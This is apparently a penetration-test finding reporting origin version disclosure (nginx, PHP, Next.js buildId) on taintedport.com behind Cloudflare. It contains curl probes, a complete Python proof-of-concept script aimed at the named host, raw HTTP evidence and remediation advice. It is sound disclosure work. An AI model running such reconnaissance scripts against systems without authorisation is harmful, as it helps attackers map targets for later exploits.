# Origin Stack Version Disclosure (nginx/1.28.3, PHP/8.2.31, Next.js) via Default 404 Body and X-Powered-By Headers

**ID:** vuln-0001
**Severity:** MEDIUM
**Found:** 2026-07-20 11:42:15 UTC
**Target:** https://taintedport.com
**Endpoint:** /_next/static/chunks/*
**Method:** GET
**CWE:** CWE-200
**CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

## Description

The origin infrastructure behind Cloudflare discloses precise version and build information about the entire server stack to unauthenticated remote users. Three independent misconfigurations combine to leak the fingerprint:

1. The origin nginx server runs with the default `server_tokens on;` and serves the stock nginx 404 error page for missing assets under `/_next/static/chunks/*`. That HTML body contains `<hr><center>nginx/1.28.3</center>`. Cloudflare rewrites the `Server` response header to `cloudflare`, but does not sanitise error-page bodies, so the origin banner passes the edge untouched.

2. The origin PHP-FPM runtime is deployed with `expose_php = On`, causing every response served by the API (both `api.taintedport.com` and `taintedport.com/api/*`) to include `X-Powered-By: PHP/8.2.31`.

3. The Next.js front-end runs with the default `poweredByHeader: true`, causing every rendered page to include `X-Powered-By: Next.js`. Additionally, the Next.js `buildId` (`MdMLzaL00rgo1quVwT_MV`) is embedded verbatim in the HTML/RSC payload of every rendered page and uniquely fingerprints the deployed build.

Combined, these three vectors give an unauthenticated attacker precise version information for the origin nginx (1.28.3), the PHP runtime (8.2.31), and the Next.js framework/build.

## Attack Flow

```
┌──────────────────────────────────────────────────────────────────────┐
│  Origin Stack Version Disclosure — attack flow                        │
└──────────────────────────────────────────────────────────────────────┘

  Prerequisites : none (fully unauthenticated, no user interaction)
  Attacker      : any remote HTTP client
  Target        : https://taintedport.com  +  https://api.taintedport.com

  ┌────────────┐                                          ┌────────────┐
  │  Attacker  │                                          │ Cloudflare │
  │  (curl)    │─────── HTTPS request ────────────────►   │   edge     │
  └────────────┘                                          └─────┬──────┘
                                                                │
                                                                │ (Server header
                                                                │  rewritten to
                                                                │  "cloudflare",
                                                                │  body pass-through)
                                                                ▼
                                                        ┌───────────────┐
                                                        │ origin nginx  │
                                                        │   1.28.3      │
                                                        │  + PHP-FPM    │
                                                        │    8.2.31     │
                                                        │  + Next.js    │
                                                        └───────────────┘

  ── Phase 1 ─ origin nginx banner ────────────────────────────────────
  GET /_next/static/chunks/xyz-does-not-exist.js
     │
     ▼
  ◄── 404  Server: cloudflare   ⟵ header masked by CDN
       body:  ...<hr><center>nginx/1.28.3</center>...
                                       ▲
                                       └── LEAK #1: origin web server + version
                                           (via response BODY, not header)

  ── Phase 2 ─ PHP runtime banner ─────────────────────────────────────
  GET https://api.taintedport.com/wines
     │
     ▼
  ◄── 200  X-Powered-By: PHP/8.2.31
                              ▲
                              └── LEAK #2: PHP runtime patch level

  ── Phase 3 ─ Next.js framework + build fingerprint ──────────────────
  GET https://taintedport.com/
     │
     ▼
  ◄── 200  X-Powered-By: Next.js
       body: ..."buildId":"MdMLzaL00rgo1quVwT_MV"...
                                                ▲
                                                └── LEAK #3: framework + unique
                                                    deployed-build fingerprint

  ── Result ───────────────────────────────────────────────────────────
  Attacker learns full stack in 3 unauthenticated requests:
      nginx  1.28.3   |   PHP  8.2.31   |   Next.js (buildId ...MV)

  Root cause: default "advertise" behaviour left enabled at three layers
      • nginx  : server_tokens on   (default)
      • PHP    : expose_php = On    (default)
      • Next.js: poweredByHeader    (default true)
    combined with Cloudflare not stripping X-Powered-By or 404 bodies.

  Downstream risk: enables day-zero targeting the moment any CVE hits
    these specific versions, and provides Shodan/Censys-matchable
    fingerprints that can assist origin-IP discovery behind the CDN.
```

## Impact

An unauthenticated remote attacker can, without any prior credentials or user interaction, obtain a precise fingerprint of the origin stack: nginx/1.28.3, PHP/8.2.31, Next.js (App Router, buildId `MdMLzaL00rgo1quVwT_MV`).

Direct impact:
- Removes the reconnaissance work an attacker would otherwise have to perform to identify the origin technology and version.
- Provides a stable and searchable fingerprint that can be correlated against Shodan/Censys indexes, aiding origin-IP discovery attempts intended to bypass the Cloudflare WAF/DDoS layer.
- Defeats one purpose of Cloudflare's edge-fingerprint masking (the `Server` header is rewritten but the origin banner exfiltrates through the response body).
- Enables day-zero targeting: once a new CVE affecting any of the disclosed versions is published, an attacker who has already cached this fingerprint can pivot immediately without re-scanning.

Confirmed impact is limited to information disclosure — no direct data exposure, state change, or authentication bypass. During this assessment no in-scope CVE was proven reachable against the disclosed versions (Next.js CVE-2025-29927 middleware bypass tested negative — the application does not use Next.js middleware for authentication).

## Technical Analysis

Three separate defence-in-depth misconfigurations combine to fingerprint the entire origin stack:

**1. nginx `server_tokens on` (default) + Cloudflare pass-through**
The origin nginx uses the default `server_tokens on;` value. Any request that reaches the origin and does not match a real file under `/_next/static/chunks/*` triggers the stock nginx 404 error document. That document's static HTML body includes the exact nginx version string:

```
<hr><center>nginx/1.28.3</center>
```

Cloudflare rewrites the `Server:` response header to `cloudflare` (visible as `Server: cloudflare` in every observed response), and the tester might reasonably assume that origin banners are hidden. However, Cloudflare's default rules do not rewrite response bodies. The nginx banner therefore exfiltrates through the HTML body rather than through the header, defeating the perceived masking. The chunks route is a good vector because `/_next/static/chunks/*` is proxied straight to nginx (Next.js static build output) and any nonexistent file returns the stock error document — so this vector works reliably without triggering WAF logic (Cloudflare even caches it, per `Cache-Control: max-age=14400`).

**2. PHP `expose_php = On` (default)**
Every response from the PHP-FPM origin — visible on both `api.taintedport.com` and `taintedport.com/api/*` — carries `X-Powered-By: PHP/8.2.31`. This is the well-known effect of leaving `expose_php = On` in `php.ini`. Cloudflare does not strip this header by default.

**3. Next.js `poweredByHeader` default (`true`)**
Every response rendered by the Next.js runtime (marketing front-end, App Router pages, API routes served by Next.js) carries `X-Powered-By: Next.js`. Additionally, the Next.js RSC/HTML payload of every rendered page contains the current `buildId` (`MdMLzaL00rgo1quVwT_MV`) verbatim, which uniquely fingerprints the deployed build.

**Root cause:** three layers of the stack — origin web server, application runtime, application framework — were left with their default advertising behaviour enabled, and the Cloudflare edge does not compensate by stripping `X-Powered-By` or origin error bodies. Any one of the three is sufficient by itself; the combination gives an attacker the entire stack in three unauthenticated requests.

**Downstream CVE reachability tests** (performed during validation to establish that the finding is scoped to information disclosure, not a downstream RCE):
- CVE-2025-29927 (Next.js middleware `x-middleware-subrequest` auth-bypass) tested against `/admin`, `/account`, `/orders/*` with the well-known five-hop payload — response body was byte-identical to the unheadered baseline. The application does not use Next.js middleware for auth (client-side redirects), so this CVE is not reachable.
- `/_next/image` SSRF-style paths: absolute URLs rejected with `"url" parameter is not allowed`.
- PHP 8.2.31: at or above published fix levels in the 8.2 branch.
- nginx 1.28.3: no unpatched CVE with a reachable exploitation path in this deployment (mp4 module not in use; HTTP/3 not exposed at the origin; TLS terminated at Cloudflare).

## Proof of Concept

Reproduction requires no credentials and consists of three unauthenticated HTTP requests.

**Step 1 — Origin nginx version leak**
Request any nonexistent path under `/_next/static/chunks/*` on `taintedport.com`. The response is HTTP 404 with the stock nginx error body; the last line of the body contains the exact origin nginx version.

```
curl -s "https://taintedport.com/_next/static/chunks/does-not-exist-$(uuidgen).js"
```
Observed body ends with `<hr><center>nginx/1.28.3</center>`. The response `Server:` header is `cloudflare`, but the origin banner is exfiltrated through the body.

**Step 2 — PHP version leak**
Any request to the API returns `X-Powered-By: PHP/8.2.31`:
```
curl -sI "https://api.taintedport.com/wines" | grep -i x-powered-by
```

**Step 3 — Next.js framework + buildId leak**
Any request to the Next.js front-end returns `X-Powered-By: Next.js`, and the HTML body contains the `buildId`:
```
curl -sI "https://taintedport.com/" | grep -i x-powered-by
curl -s  "https://taintedport.com/" | grep -oE 'buildId[^,]{0,60}'
```

The bundled `poc.py` automates all three checks and prints the extracted versions. `verify.py` returns exit code 0 while the vulnerability is still exploitable.

```
     1	#!/usr/bin/env python3
     2	"""Exploit: Version banner disclosure at taintedport.com.
     3	
     4	Demonstrates three information-disclosure vectors that together reveal the
     5	full origin stack behind the Cloudflare edge:
     6	
     7	  1. Origin nginx version leaks in the body of the default 404 page
     8	     served for any missing asset under /_next/static/chunks/*
     9	     (Cloudflare rewrites the `Server` header but does NOT sanitise the body).
    10	  2. PHP major.minor.patch leaks via `X-Powered-By: PHP/x.y.z` on every
    11	     response from api.taintedport.com and taintedport.com/api/*
    12	     (expose_php = On in php.ini).
    13	  3. Next.js framework and buildId leak via `X-Powered-By: Next.js` and
    14	     the buildId embedded verbatim in the HTML of every rendered page
    15	     (poweredByHeader defaulted to true).
    16	
    17	The script requires no credentials — it demonstrates a fully unauthenticated
    18	reconnaissance leak.
    19	
    20	Optional environment variables:
    21	    TARGET_URL         Base site URL     (default: https://taintedport.com)
    22	    API_URL            Base API URL      (default: https://api.taintedport.com)
    23	
    24	Usage:
    25	    python3 poc.py
    26	    python3 poc.py --no-pause
    27	"""
    28	import argparse
    29	import os
    30	import re
    31	import sys
    32	import urllib3
    33	import uuid
    34	
    35	import requests
    36	
    37	urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    38	
    39	RED = "\033[91m"
    40	GREEN = "\033[92m"
    41	YELLOW = "\033[93m"
    42	CYAN = "\033[96m"
    43	BOLD = "\033[1m"
    44	RESET = "\033[0m"
    45	
    46	TARGET_URL = os.environ.get("TARGET_URL", "https://taintedport.com").rstrip("/")
    47	API_URL = os.environ.get("API_URL", "https://api.taintedport.com").rstrip("/")
    48	
    49	
    50	def step(n, msg):
    51	    print(f"{CYAN}[Step {n}]{RESET} {msg}")
    52	
    53	
    54	def ok(msg):
    55	    print(f"  {GREEN}✓ {msg}{RESET}")
    56	
    57	
    58	def fail(msg):
    59	    print(f"  {RED}✗ {msg}{RESET}")
    60	    sys.exit(1)
    61	
    62	
    63	def leak(msg):
    64	    print(f"  {RED}{BOLD}>>> LEAK: {msg}{RESET}")
    65	
    66	
    67	def run(interactive: bool = True):
    68	    def pause(msg="Press Enter to continue..."):
    69	        if interactive:
    70	            input(f"\n  >>> {msg}")
    71	
    72	    print(f"\n{BOLD}{'=' * 68}")
    73	    print(f"  EXPLOIT: Version-banner disclosure (nginx / PHP / Next.js)")
    74	    print(f"  Target:  {TARGET_URL}")
    75	    print(f"           {API_URL}")
    76	    print(f"{'=' * 68}{RESET}\n")
    77	
    78	    findings = {}
    79	
    80	    # --------------------------------------------------------------------- #
    81	    # Vector 1: origin nginx version via default 404 body
    82	    # --------------------------------------------------------------------- #
    83	    step(1, "Requesting a nonexistent Next.js chunk to trigger the origin nginx 404 page")
    84	    probe = f"{TARGET_URL}/_next/static/chunks/does-not-exist-{uuid.uuid4().hex[:8]}.js"
    85	    r = requests.get(probe, verify=False, timeout=15)
    86	    print(f"  URL        : {probe}")
    87	    print(f"  HTTP       : {r.status_code}")
    88	    print(f"  Server hdr : {r.headers.get('Server')!r}  (Cloudflare rewrites this)")
    89	
    90	    m = re.search(r"nginx/([0-9][0-9.]*)", r.text)
    91	    if r.status_code == 404 and m:
    92	        nginx_version = m.group(1)
    93	        findings["nginx"] = nginx_version
    94	        ok("Origin nginx version disclosed inside 404 HTML body")
    95	        print(f"  Body excerpt: {r.text.strip().splitlines()[-2].strip()}")
    96	        leak(f"Origin nginx version = {nginx_version}")
    97	    else:
    98	        fail("Did not observe the nginx banner in the 404 body")
    99	
   100	    pause()
   101	
   102	    # --------------------------------------------------------------------- #
   103	    # Vector 2: PHP version via X-Powered-By on the API
   104	    # --------------------------------------------------------------------- #
   105	    step(2, "Probing api.taintedport.com for the X-Powered-By header (PHP)")
   106	    r = requests.get(f"{API_URL}/wines", verify=False, timeout=15)
   107	    xpb = r.headers.get("X-Powered-By", "")
   108	    print(f"  HTTP           : {r.status_code}")
   109	    print(f"  X-Powered-By   : {xpb!r}")
   110	
   111	    m = re.match(r"PHP/([0-9][0-9.]*)", xpb)
   112	    if m:
   113	        php_version = m.group(1)
   114	        findings["php"] = php_version
   115	        ok("PHP runtime version disclosed via X-Powered-By")
   116	        leak(f"PHP version = {php_version}")
   117	    else:
   118	        fail("PHP X-Powered-By header not present on the API")
   119	
   120	    pause()
   121	
   122	    # --------------------------------------------------------------------- #
   123	    # Vector 3: Next.js + buildId via HTML front-end
   124	    # --------------------------------------------------------------------- #
   125	    step(3, "Fetching the marketing front-end (Next.js) for X-Powered-By + buildId")
   126	    r = requests.get(f"{TARGET_URL}/", verify=False, timeout=15)
   127	    xpb = r.headers.get("X-Powered-By", "")
   128	    print(f"  HTTP           : {r.status_code}")
   129	    print(f"  X-Powered-By   : {xpb!r}")
   130	
   131	    m_build = re.search(r'buildId\\?"\s*:\s*\\?"([A-Za-z0-9_-]+)\\?"', r.text)
   132	    build_id = m_build.group(1) if m_build else None
   133	    if xpb.lower() == "next.js":
   134	        findings["nextjs"] = "framework"
   135	        ok("Next.js framework disclosed via X-Powered-By")
   136	    else:
   137	        fail("X-Powered-By: Next.js header not present on the front-end")
   138	
   139	    if build_id:
   140	        findings["buildId"] = build_id
   141	        ok("Next.js buildId embedded in HTML")
   142	        leak(f"Next.js buildId = {build_id}")
   143	    else:
   144	        print(f"  {YELLOW}(buildId not extracted — pattern mismatch, not a failure){RESET}")
   145	
   146	    # --------------------------------------------------------------------- #
   147	    # Summary
   148	    # --------------------------------------------------------------------- #
   149	    print(f"\n{BOLD}{'=' * 68}{RESET}")
   150	    print(f"{RED}{BOLD}  >>> VULNERABILITY CONFIRMED — Version banners exposed{RESET}")
   151	    print(f"{RED}    Origin nginx : {findings.get('nginx')}{RESET}")
   152	    print(f"{RED}    PHP runtime  : {findings.get('php')}{RESET}")
   153	    print(f"{RED}    Framework    : Next.js (buildId={findings.get('buildId')}){RESET}")
   154	    print()
   155	    print("  These identifiers let an unauthenticated attacker map the exact")
   156	    print("  stack, correlate this host to Shodan/Censys fingerprints, and")
   157	    print("  pivot to any future CVE affecting these versions at day zero.")
   158	    print(f"{BOLD}{'=' * 68}{RESET}\n")
   159	
   160	
   161	if __name__ == "__main__":
   162	    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
   163	    parser.add_argument("--no-pause", action="store_true", help="Run without interactive pauses")
   164	    args = parser.parse_args()
   165	    run(interactive=not args.no_pause)
```

## Evidence

### 1. Origin nginx version leaks via default 404 HTML body under /_next/static/chunks/*

**Request:**
```http
GET /_next/static/chunks/does-not-exist-bfecb5a0.js HTTP/1.1
Host: taintedport.com
Accept: */*
```

**Response:**
```http
HTTP/1.1 404 Not Found
Server: cloudflare
Cache-Control: max-age=14400
Cf-Cache-Status: MISS
Content-Type: text/html

<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.28.3</center>
</body>
</html>
```

> Cloudflare rewrites the Server header to 'cloudflare' but does not sanitise the response body. The origin nginx version (1.28.3) is exfiltrated through the default 404 error document, defeating the edge banner-stripping.

### 2. PHP runtime version leaks via X-Powered-By header on the API

**Request:**
```http
GET /wines HTTP/1.1
Host: api.taintedport.com
Accept: */*
```

**Response:**
```http
HTTP/1.1 200 OK
Server: cloudflare
X-Powered-By: PHP/8.2.31
Content-Type: application/json
```

> expose_php = On at the origin PHP-FPM. The X-Powered-By header is present on every response from api.taintedport.com and taintedport.com/api/* and reveals the exact PHP patch level.

### 3. Next.js framework and buildId leak on the front-end

**Request:**
```http
GET / HTTP/1.1
Host: taintedport.com
Accept: text/html
```

**Response:**
```http
HTTP/1.1 200 OK
Server: cloudflare
X-Powered-By: Next.js
Content-Type: text/html

... "buildId":"MdMLzaL00rgo1quVwT_MV" ...
```

> poweredByHeader defaulted to true; every rendered page advertises Next.js. In addition, the current build fingerprint (buildId MdMLzaL00rgo1quVwT_MV) is embedded verbatim in the HTML/RSC payload of every rendered page.


## Remediation

Suppress version banners at every layer of the stack, and strip them defensively at the edge.

1. **nginx (origin)** — set `server_tokens off;` in the `http {}` block and configure a custom static 404 page that does not include the server banner:
   ```nginx
   http {
     server_tokens off;
     server {
       error_page 404 /404.html;
       location = /404.html { root /var/www/errors; internal; }
     }
   }
   ```
   After deploying, purge Cloudflare's cache for the `/_next/static/chunks/*` 404 entries (currently cached for 4 hours per `Cache-Control: max-age=14400`).

2. **PHP-FPM** — set `expose_php = Off` in `php.ini` (or the corresponding pool `.conf` file) and reload PHP-FPM. Verify with:
   ```
   curl -sI https://api.taintedport.com/wines | grep -i x-powered-by
   ```
   The header should no longer appear.

3. **Next.js** — set `poweredByHeader: false` in `next.config.js`:
   ```js
   module.exports = {
     poweredByHeader: false,
     // ... existing configuration
   };
   ```
   Rebuild and redeploy. If the deployed `buildId` is considered sensitive, set a deterministic non-descriptive value via the `generateBuildId` config option.

4. **Cloudflare (defence in depth)** — add a Transform Rule (or a Worker) that strips `X-Powered-By`, `X-Nextjs-Cache`, and any other fingerprinting headers from all responses. Optionally rewrite origin 404 bodies to a fixed template.

5. **Regression verification** — re-run the provided `verify.py`; it should print `[NOT VULNERABLE]` and exit with code 1 once all three banners are removed.

## Conditions for Severity Increase

If a Remote Code Execution, authentication-bypass, or denial-of-service CVE is published affecting nginx 1.28.3, PHP 8.2.31, or the deployed Next.js version, an attacker who has recorded the fingerprints exposed here will be able to target this host at day zero — raising effective impact from information disclosure to whatever the new CVE enables (potentially Critical).

Additionally, if the disclosed fingerprints (particularly the nginx build string and Next.js `buildId`) are correlatable to entries in public search engines such as Shodan/Censys, they can facilitate discovery of the origin IP behind Cloudflare, bypassing the WAF/DDoS layer and exposing the origin to direct attack (Confidentiality/Integrity/Availability all potentially escalate).
